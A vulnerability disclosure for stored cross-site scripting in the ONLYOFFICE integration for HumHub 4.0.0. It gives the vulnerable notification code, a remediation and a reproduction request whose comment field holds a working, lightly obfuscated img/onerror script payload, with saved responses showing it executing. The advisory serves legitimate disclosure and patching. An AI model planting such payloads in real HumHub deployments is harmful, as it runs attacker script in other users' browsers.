# ONLYOFFICE for HumHub notification stored XSS

## Summary

ONLYOFFICE for HumHub 4.0.0 contains stored cross-site scripting in the send-notify notification flow. An authenticated user can supply an attacker-controlled comment and target another user's email address; notification HTML includes the comment preview without output encoding. The payload executes when the target opens the HumHub notification overview. The tested endpoint did not enforce access to the referenced document key.

## Affected product

- Vendor/project: **ONLYOFFICE**
- Product: **ONLYOFFICE integration for HumHub**
- Affected version: **4.0.0**
- Weakness: **CWE-79**
- CVSS 3.1: `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N (5.4)`
- Verification: **STABLE — 3/3 consecutive fresh runs**

## Researcher

- **Zhong Guangyuan, Fudan University**

## Attack prerequisites and impact

Authenticated attacker; valid referenced document key; target opens notification overview.

Verified flow: `send-notify comment → Mention.message → Mention::html() raw concatenation → notification overview`

Successful exploitation permits attacker-controlled markup or script to execute in another user's browser in the affected application origin. The exact privilege and interaction requirements are reflected in the CVSS vector above.

## Reproduction

1. Send a document mention notification containing an HTML marker in the comment field.
2. Confirm the Mention record stores the raw comment preview.
3. Open the target user's notification overview and inspect the notification HTML.

Sanitized request shape used during verification:

```http
# Authenticated attacker; target and document identifiers redacted
POST <BASE_URL>/onlyoffice/api/send-notify
Cookie: <ATTACKER_SESSION_COOKIE>
X-CSRF-Token: <CSRF>
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded

emails[]=<VICTIM_EMAIL>
comment=<img id=gt481023h3c src=x onerror=self["pro"+"mpt"](3)>
ACTION_DATA=anchor-gt481023h3c
doc_key=<VALID_DOCUMENT_KEY>

# Target opens notifications
GET <BASE_URL>/notification/overview
Cookie: <VICTIM_SESSION_COOKIE>
```

Authentication values, private host/IP values, internal identifiers, CSRF values, document keys and one-time tokens are redacted. Parameter names, affected endpoints and payload structure are retained.

## Fresh verification evidence

| Run | Marker | Observation | Result |
| --- | --- | --- | --- |
| 1 | `gt481023h3a` | HTTP 200; raw_hit=true | **PASS** |
| 2 | `gt481023h3b` | HTTP 200; raw_hit=true | **PASS** |
| 3 | `gt481023h3c` | HTTP 200; raw_hit=true | **PASS** |

```text
Saved notification response, run 3:
<strong>Gt48 gt481023h3c</strong>
... mentioned you in crawler-test-file.docx.
<img id=gt481023h3c src=x onerror=self["pro"+"mpt"](3)>

overview_status: 200
raw_hit: true
Stored Mention record: confirmed during the run.
```

The evidence was generated from a researcher-controlled test deployment. Test records were cleaned after verification.

## Confirmed source and Sink

```text
ApiController.php:139-151
$message = Yii::$app->request->post('comment');
$mention = Mention::generateMention($file, $message, $anchor);

notifications/Mention.php:24-34
public function html() {
    return Yii::t(...);
        . ' ' . $this->source->message;
}
```

Root cause: The send-notify comment becomes Mention.message. Mention::html() concatenates that stored message into notification HTML without output encoding.

## Recommended remediation

Encode the message as text in Mention::html(), or sanitize to an explicit allowlist before storage and again at the HTML boundary.

## References

- Official source: https://github.com/ONLYOFFICE/onlyoffice-humhub/blob/master/notifications/Mention.php

## Evidence images

The three public evidence images show, in order:

1. The sanitized reproduction request, endpoint, parameter and payload structure.
2. The three consecutive successful verification runs and exact response/DOM/database excerpts.
3. The highlighted attacker-controlled source and unsafe rendering Sink.

The images are compact reviewer captures rendered from saved raw HTTP/DOM/database evidence. They preserve the verified request, response/DOM evidence, and highlighted source-to-Sink path while redacting credentials and private deployment details.

### Sanitized reproduction

![CAN-16 sanitized reproduction](https://raw.githubusercontent.com/TERRENCE-REX/CVE/main/evidence/CAN-16/01-reproduction-v2.png)

### Three-run success proof

![CAN-16 three-run success proof](https://raw.githubusercontent.com/TERRENCE-REX/CVE/main/evidence/CAN-16/02-success-proof-v2.png)

### Source-to-Sink evidence

![CAN-16 source-to-Sink evidence](https://raw.githubusercontent.com/TERRENCE-REX/CVE/main/evidence/CAN-16/03-source-sink-v2.png)
